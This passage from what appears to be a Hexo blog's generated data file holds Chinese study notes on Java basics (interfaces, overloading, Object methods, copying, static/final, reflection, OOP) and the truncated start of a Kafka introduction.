true</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-toString\"><a href=\"#3-toString\" class=\"headerlink\" title=\"(3).toString()\"></a>(3).toString()</h6><p>返回 类型(class)@hash的无符号十六进制<br><br>例：ToStringExample@4554617c <br></p>\n<h3 id=\"4-浅拷贝和深拷贝\"><a href=\"#4-浅拷贝和深拷贝\" class=\"headerlink\" title=\"4.浅拷贝和深拷贝\"></a>4.浅拷贝和深拷贝</h3><p>在 Java 中，除了基本数据类型（元类型）之外，还存在 类的实例对象 这个引用数据类型。而一般使用 = 号做赋值操作的时候。对于基本数据类型，实际上是拷贝的它的值，但是对于对象而言，其实赋值的只是这个对象的引用，将原对象的引用传递过去。<br></p>\n<p>而浅拷贝和深拷贝就是在这个基础之上做的区分，如果在拷贝这个对象的时候，对引用数据类型<strong>只是进行了引用的传递</strong>，而没有真实的创建一个新的对象，则认为是浅拷贝。反之，在对引用数据类型进行拷贝的时候，<strong>创建了一个新的对象，并且复制其内的成员变量</strong>，则认为是深拷贝。<br></p>\n<h3 id=\"5-final与static\"><a href=\"#5-final与static\" class=\"headerlink\" title=\"5.final与static\"></a>5.final与static</h3><p>final可以修饰：属性，方法，类，局部变量（方法中的变量）<br><br>static可以修饰：属性，方法，代码段，内部类（静态内部类或嵌套内部类）<br></p>\n<p>static修饰的属性强调它们只有一个，可以在不new对象的情况下调用，final强调不能修改。static final修饰的属性表示一旦给值，就不可修改，并且可以通过类名访问。<br></p>\n<p>初始化顺序:静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。<br></p>\n<h3 id=\"6-反射\"><a href=\"#6-反射\" class=\"headerlink\" title=\"6.反射\"></a>6.反射</h3><h5 id=\"为什么要用反射\"><a href=\"#为什么要用反射\" class=\"headerlink\" title=\"为什么要用反射\"></a>为什么要用反射</h5><p>反射的核心是可以在运行时才动态加载类的信息。<br><br>利用这个特性，可以使代码变得灵活，如一开始不知道某个类的信息，不能new,但是可以通过配置文件或者插件等引入，使用反射在运行时加载。利用配置文件时，可以将类描述(属性信息)写在配置文件中，不用每次修改代码<br><br>反射会牺牲一点性能。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-抽象类和接口\"><a href=\"#1-抽象类和接口\" class=\"headerlink\" title=\"1.抽象类和接口\"></a>1.抽象类和接口</h3><h6 id=\"1-为什么要有抽象类\"><a href=\"#1-为什么要有抽象类\" class=\"headerlink\" title=\"(1).为什么要有抽象类\"></a>(1).为什么要有抽象类</h6><p>引入抽象方法和抽象类，是Java提供的一种语法工具，对于一些类和方法，引导使用者正确使用它们，减少被误用。<br></p>\n<p>使用抽象方法，而非空方法体，子类就知道他必须要实现该方法，而不可能忽略。<br></p>\n<p>使用抽象类，类的使用者创建对象的时候，就知道他必须要使用某个具体子类，而不可能误用不完整的父类。<br></p>\n<p>总结，1.规范，2.减少误用。<br></p>\n<h6 id=\"2-有了抽象类为什么还要接口\"><a href=\"#2-有了抽象类为什么还要接口\" class=\"headerlink\" title=\"(2).有了抽象类为什么还要接口\"></a>(2).有了抽象类为什么还要接口</h6><p>抽象类是一个类，Java一个类可以实现多个接口，但只能继承一个类(继承的好处是复用代码)。所以需要接口。<br><br>抽象类和接口是配合而非替代关系，它们经常一起使用，接口声明能力，抽象类提供默认实现，实现全部或部分方法，一个接口经常有一个对应的抽象类。抽象类实现接口部分方法，然后继承于抽象类的类就可以只实现剩下的方法。<br></p>\n<p>Collection接口和对应的AbstractCollection抽象类<br><br>List接口和对应的AbstractList抽象类<br><br>Map接口和对应的AbstractMap抽象类<br></p>\n<h6 id=\"3-接口和抽象类\"><a href=\"#3-接口和抽象类\" class=\"headerlink\" title=\"(3).接口和抽象类\"></a>(3).接口和抽象类</h6><p>抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类<br></p>\n<p>接口可以类似的看成一个方法全是抽象方法的抽象类。</p>\n<p>接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。<br><br>接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。<br></p>\n<p>所以在使用的选择时:</p>\n<ul>\n<li>使用接口：</li>\n</ul>\n<p>需要让不相关的类都实现一个方法<br><br>需要使用多重继承。<br></p>\n<ul>\n<li>使用抽象类：</li>\n</ul>\n<p>需要在几个相关的类中共享代码。(实现部分方法)<br><br>需要能控制继承来的成员的访问权限，而不是都为 public。<br><br>需要继承非静态和非常量字段。<br></p>\n<h3 id=\"2-重写与重载\"><a href=\"#2-重写与重载\" class=\"headerlink\" title=\"2.重写与重载\"></a>2.重写与重载</h3><p>override/overload<br></p>\n<p>为了满足里式替换原则，重写有以下三个限制：<br></p>\n<blockquote>\n<p>子类方法的访问权限必须大于等于父类方法；<br><br>子类方法的返回类型必须是父类方法返回类型或为其子类型。<br><br>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。<br></p>\n</blockquote>\n<p>JVM虚拟机中，重载实际上调用 的封装类型，重写实际上调用的实际类型<br></p>\n<h3 id=\"3-Object\"><a href=\"#3-Object\" class=\"headerlink\" title=\"3.Object\"></a>3.Object</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public native int hashCode()</span><br><span class=\"line\"></span><br><span class=\"line\">public boolean equals(Object obj)</span><br><span class=\"line\"></span><br><span class=\"line\">protected native Object clone() throws CloneNotSupportedException</span><br><span class=\"line\"></span><br><span class=\"line\">public String toString()</span><br><span class=\"line\"></span><br><span class=\"line\">public final native Class&lt;?&gt; getClass()</span><br><span class=\"line\"></span><br><span class=\"line\">protected void finalize() throws Throwable &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public final native void notify()</span><br><span class=\"line\"></span><br><span class=\"line\">public final native void notifyAll()</span><br><span class=\"line\"></span><br><span class=\"line\">public final native void wait(long timeout) throws InterruptedException</span><br><span class=\"line\"></span><br><span class=\"line\">public final void wait(long timeout, int nanos) throws InterruptedException</span><br><span class=\"line\"></span><br><span class=\"line\">public final void wait() throws InterruptedException</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-hashCode\"><a href=\"#1-hashCode\" class=\"headerlink\" title=\"(1).hashCode()\"></a>(1).hashCode()</h6><p>采用操作系统底层实现的哈希算法,返回对象的hash值。 同一个对象的哈希码值是唯一的。<br></p>\n<h6 id=\"2-equals\"><a href=\"#2-equals\" class=\"headerlink\" title=\"(2).equals()\"></a>(2).equals()</h6><p>equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。<br><br>等价关系：自反性/对称性/传递性/一致性<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">自反：x.equals(x); // true</span><br><span class=\"line\"></span><br><span class=\"line\">对称：x.equals(y) == y.equals(x); // true</span><br><span class=\"line\"></span><br><span class=\"line\">传递：if (x.equals(y) &amp;&amp; y.equals(z))</span><br><span class=\"line\">    x.equals(z); // true;</span><br><span class=\"line\"></span><br><span class=\"line\">一致：x.equals(y) == x.equals(y); // true</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-toString\"><a href=\"#3-toString\" class=\"headerlink\" title=\"(3).toString()\"></a>(3).toString()</h6><p>返回 类型(class)@hash的无符号十六进制<br><br>例：ToStringExample@4554617c <br></p>\n<h3 id=\"4-浅拷贝和深拷贝\"><a href=\"#4-浅拷贝和深拷贝\" class=\"headerlink\" title=\"4.浅拷贝和深拷贝\"></a>4.浅拷贝和深拷贝</h3><p>在 Java 中，除了基本数据类型（元类型）之外，还存在 类的实例对象 这个引用数据类型。而一般使用 = 号做赋值操作的时候。对于基本数据类型，实际上是拷贝的它的值，但是对于对象而言，其实赋值的只是这个对象的引用，将原对象的引用传递过去。<br></p>\n<p>而浅拷贝和深拷贝就是在这个基础之上做的区分，如果在拷贝这个对象的时候，对引用数据类型<strong>只是进行了引用的传递</strong>，而没有真实的创建一个新的对象，则认为是浅拷贝。反之，在对引用数据类型进行拷贝的时候，<strong>创建了一个新的对象，并且复制其内的成员变量</strong>，则认为是深拷贝。<br></p>\n<h3 id=\"5-final与static\"><a href=\"#5-final与static\" class=\"headerlink\" title=\"5.final与static\"></a>5.final与static</h3><p>final可以修饰：属性，方法，类，局部变量（方法中的变量）<br><br>static可以修饰：属性，方法，代码段，内部类（静态内部类或嵌套内部类）<br></p>\n<p>static修饰的属性强调它们只有一个，可以在不new对象的情况下调用，final强调不能修改。static final修饰的属性表示一旦给值，就不可修改，并且可以通过类名访问。<br></p>\n<p>初始化顺序:静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。<br></p>\n<h3 id=\"6-反射\"><a href=\"#6-反射\" class=\"headerlink\" title=\"6.反射\"></a>6.反射</h3><h5 id=\"为什么要用反射\"><a href=\"#为什么要用反射\" class=\"headerlink\" title=\"为什么要用反射\"></a>为什么要用反射</h5><p>反射的核心是可以在运行时才动态加载类的信息。<br><br>利用这个特性，可以使代码变得灵活，如一开始不知道某个类的信息，不能new,但是可以通过配置文件或者插件等引入，使用反射在运行时加载。利用配置文件时，可以将类描述(属性信息)写在配置文件中，不用每次修改代码<br><br>反射会牺牲一点性能。</p>\n"},{"title":"Java集合","date":"2019-08-20T14:56:34.000Z","_content":"\n1.[collection]()\n\n2.[Map]()\n","source":"_posts/java/java集合.md","raw":"---\ntitle: Java集合\ndate: 2019-08-20 10:56:34\ntags: [Index2]\n---\n\n1.[collection]()\n\n2.[Map]()\n","slug":"java/java集合","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i000146dcph8cnx3vb","content":"<p>1.<a href=\"\">collection</a></p>\n<p>2.<a href=\"\">Map</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.<a href=\"\">collection</a></p>\n<p>2.<a href=\"\">Map</a></p>\n"},{"title":"java面向对象","date":"2018-09-21T20:09:38.000Z","_content":"\n#### 1.java面向对象\n###### 面向对象（Object Oriented）<br>\n其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.\n从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式\n\n###### 对象<br>\n对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br>\n类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。\n当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，\n把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。\n\n###### 类<br>\n类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。\n在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br>\n\n>变量<br>\nstatic: 静态变量/静态方法(类变量/类方法，类层面上)<br>\nfinal: 常量(全局层面上)\n\n> 方法<br>\nstatic: 类方法，可通过类名直接调用<br>\nabstract: 抽象方法，没有方法体<br>\nfinal: 方法不能被重写<br>\nnative: 集成其它语言的代码<br>\nsynchronized: 控制多个并发线程的访问<br>\n方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br>\n对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br>\n\t方法体<br>\n\t方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br>\n\t为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br>\n\n> 构造方法<br>\n构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br>\n构造方法具有和类名相同的名称，而且不返回任何数据类型。<br>\n重载经常用于构造方法。<br>\n构造方法只能由new运算符调用<br>\n<!-- more -->\n\n#### 2.java面向对象三大特点\n###### 封装<br>\n封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br>\n可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br>\n\n###### 继承extends\n子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br>\nJava中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br>\n继承实现了代码的复用。<br>\nJava中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br>\n子类不能继承父类中访问权限为private的成员变量和方法。<br>\n子类可以重写父类的方法，即命名与父类同名的成员变量。<br>\nJava中通过super来实现对父类成员的访问，super用来引用当前对象的父类。\n\n###### 多态\n对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br>\n其实就是重载和重写.<br>\n\n  >重载<br>\n\t方法重载是让类以统一的方式处理不同数据类型的手段。\n\t一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。\n\t返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br>\n  重写<br>\n\t子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。\n\t如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。\n\t子类函数的访问修饰权限不能低于父类的\n","source":"_posts/java/java面向对象.md","raw":"---\ntitle: java面向对象\ndate: 2018-09-21 16:09:38\ntags: [java, 面向对象]\n---\n\n#### 1.java面向对象\n###### 面向对象（Object Oriented）<br>\n其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.\n从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式\n\n###### 对象<br>\n对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br>\n类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。\n当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，\n把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。\n\n###### 类<br>\n类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。\n在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br>\n\n>变量<br>\nstatic: 静态变量/静态方法(类变量/类方法，类层面上)<br>\nfinal: 常量(全局层面上)\n\n> 方法<br>\nstatic: 类方法，可通过类名直接调用<br>\nabstract: 抽象方法，没有方法体<br>\nfinal: 方法不能被重写<br>\nnative: 集成其它语言的代码<br>\nsynchronized: 控制多个并发线程的访问<br>\n方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br>\n对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br>\n\t方法体<br>\n\t方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br>\n\t为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br>\n\n> 构造方法<br>\n构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br>\n构造方法具有和类名相同的名称，而且不返回任何数据类型。<br>\n重载经常用于构造方法。<br>\n构造方法只能由new运算符调用<br>\n<!-- more -->\n\n#### 2.java面向对象三大特点\n###### 封装<br>\n封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br>\n可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br>\n\n###### 继承extends\n子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br>\nJava中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br>\n继承实现了代码的复用。<br>\nJava中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br>\n子类不能继承父类中访问权限为private的成员变量和方法。<br>\n子类可以重写父类的方法，即命名与父类同名的成员变量。<br>\nJava中通过super来实现对父类成员的访问，super用来引用当前对象的父类。\n\n###### 多态\n对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br>\n其实就是重载和重写.<br>\n\n  >重载<br>\n\t方法重载是让类以统一的方式处理不同数据类型的手段。\n\t一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。\n\t返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br>\n  重写<br>\n\t子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。\n\t如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。\n\t子类函数的访问修饰权限不能低于父类的\n","slug":"java/java面向对象","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i100166dcp40nud7me","content":"<h4 id=\"1-java面向对象\"><a href=\"#1-java面向对象\" class=\"headerlink\" title=\"1.java面向对象\"></a>1.java面向对象</h4><h6 id=\"面向对象（Object-Oriented）\"><a href=\"#面向对象（Object-Oriented）\" class=\"headerlink\" title=\"面向对象（Object Oriented）\"></a>面向对象（Object Oriented）<br></h6><p>其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.<br>从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式</p>\n<h6 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象<br></h6><p>对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br><br>类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。<br>当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，<br>把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。</p>\n<h6 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类<br></h6><p>类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。<br>在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br></p>\n<blockquote>\n<p>变量<br><br>static: 静态变量/静态方法(类变量/类方法，类层面上)<br><br>final: 常量(全局层面上)</p>\n</blockquote>\n<blockquote>\n<p>方法<br><br>static: 类方法，可通过类名直接调用<br><br>abstract: 抽象方法，没有方法体<br><br>final: 方法不能被重写<br><br>native: 集成其它语言的代码<br><br>synchronized: 控制多个并发线程的访问<br><br>方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br><br>对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br><br>    方法体<br><br>    方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br><br>    为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br></p>\n</blockquote>\n<blockquote>\n<p>构造方法<br><br>构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br><br>构造方法具有和类名相同的名称，而且不返回任何数据类型。<br><br>重载经常用于构造方法。<br><br>构造方法只能由new运算符调用<br><br><a id=\"more\"></a></p>\n</blockquote>\n<h4 id=\"2-java面向对象三大特点\"><a href=\"#2-java面向对象三大特点\" class=\"headerlink\" title=\"2.java面向对象三大特点\"></a>2.java面向对象三大特点</h4><h6 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装<br></h6><p>封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br><br>可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br></p>\n<h6 id=\"继承extends\"><a href=\"#继承extends\" class=\"headerlink\" title=\"继承extends\"></a>继承extends</h6><p>子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br><br>Java中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br><br>继承实现了代码的复用。<br><br>Java中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br><br>子类不能继承父类中访问权限为private的成员变量和方法。<br><br>子类可以重写父类的方法，即命名与父类同名的成员变量。<br><br>Java中通过super来实现对父类成员的访问，super用来引用当前对象的父类。</p>\n<h6 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h6><p>对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br><br>其实就是重载和重写.<br></p>\n<blockquote>\n<p>重载<br><br>    方法重载是让类以统一的方式处理不同数据类型的手段。<br>    一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。<br>    返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br><br>  重写<br><br>    子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。<br>    如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。<br>    子类函数的访问修饰权限不能低于父类的</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h4 id=\"1-java面向对象\"><a href=\"#1-java面向对象\" class=\"headerlink\" title=\"1.java面向对象\"></a>1.java面向对象</h4><h6 id=\"面向对象（Object-Oriented）\"><a href=\"#面向对象（Object-Oriented）\" class=\"headerlink\" title=\"面向对象（Object Oriented）\"></a>面向对象（Object Oriented）<br></h6><p>其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.<br>从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式</p>\n<h6 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象<br></h6><p>对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br><br>类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。<br>当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，<br>把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。</p>\n<h6 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类<br></h6><p>类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。<br>在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br></p>\n<blockquote>\n<p>变量<br><br>static: 静态变量/静态方法(类变量/类方法，类层面上)<br><br>final: 常量(全局层面上)</p>\n</blockquote>\n<blockquote>\n<p>方法<br><br>static: 类方法，可通过类名直接调用<br><br>abstract: 抽象方法，没有方法体<br><br>final: 方法不能被重写<br><br>native: 集成其它语言的代码<br><br>synchronized: 控制多个并发线程的访问<br><br>方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br><br>对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br><br>    方法体<br><br>    方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br><br>    为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br></p>\n</blockquote>\n<blockquote>\n<p>构造方法<br><br>构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br><br>构造方法具有和类名相同的名称，而且不返回任何数据类型。<br><br>重载经常用于构造方法。<br><br>构造方法只能由new运算符调用<br><br>","more":"</p>\n</blockquote>\n<h4 id=\"2-java面向对象三大特点\"><a href=\"#2-java面向对象三大特点\" class=\"headerlink\" title=\"2.java面向对象三大特点\"></a>2.java面向对象三大特点</h4><h6 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装<br></h6><p>封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br><br>可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br></p>\n<h6 id=\"继承extends\"><a href=\"#继承extends\" class=\"headerlink\" title=\"继承extends\"></a>继承extends</h6><p>子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br><br>Java中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br><br>继承实现了代码的复用。<br><br>Java中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br><br>子类不能继承父类中访问权限为private的成员变量和方法。<br><br>子类可以重写父类的方法，即命名与父类同名的成员变量。<br><br>Java中通过super来实现对父类成员的访问，super用来引用当前对象的父类。</p>\n<h6 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h6><p>对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br><br>其实就是重载和重写.<br></p>\n<blockquote>\n<p>重载<br><br>    方法重载是让类以统一的方式处理不同数据类型的手段。<br>    一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。<br>    返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br><br>  重写<br><br>    子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。<br>    如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。<br>    子类函数的访问修饰权限不能低于父类的</p>\n</blockquote>"},{"title":"kafka初了解","date":"2019-10-09T17:23:25.000Z","_content":"\n\nwin下Kafka测试环境搭建：https://blog.csdn.net/u012050154/article/details/76270655\n\n# 一.Kafka是什么\n\n## 1.是什么\n\n我的理解是，kafka是一个分布式的消息队列，提供发布订阅功能.\n\n## 2.专有名词\n\nBroker/Topic/Partition/Producer/Consumer/Consumer Group<br>\n\n- Broker\n\n  Kafka集群包含一个或多个服务器，这种服务器被称为broker.\n\n- topic\n\n  每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic（物理上不同Topic的消息分开存储[表现于日志落地]，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处）\n\n- partition\n\n  Parition是物理上的概念，每个Topic包含一个或多个Partition.\n\n- Producer\n\n  消息生产者\n\n- Consumer\n\n  